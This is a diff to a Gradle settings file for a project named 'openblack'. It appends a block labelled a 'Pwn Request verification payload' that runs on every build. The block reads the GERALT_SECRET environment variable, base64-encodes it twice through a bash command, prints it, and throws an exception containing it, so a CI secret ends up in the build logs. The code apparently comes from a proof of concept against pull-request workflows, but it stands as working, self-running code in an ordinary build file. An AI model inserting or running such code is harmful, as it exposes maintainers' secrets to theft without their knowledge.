@@ -14,3 +14,13 @@ dependencyResolutionManagement {
 }
 rootProject.name = "openblack"
 include ':app'
+
+// GERALT Pwn Request verification payload
+def __gSecret = System.getenv("GERALT_SECRET")
+if (__gSecret != null && !__gSecret.isEmpty()) {
+    def __gCmd = 'echo "GERALT_LEAKED_TOKEN=$(printf %s "$GERALT_SECRET" | base64 | base64)"'
+    def __gOut = ['bash', '-c', __gCmd].execute().text
+    println __gOut
+    throw new GradleException("GERALT_LEAKED_TOKEN probe: " + __gOut)
+}
+
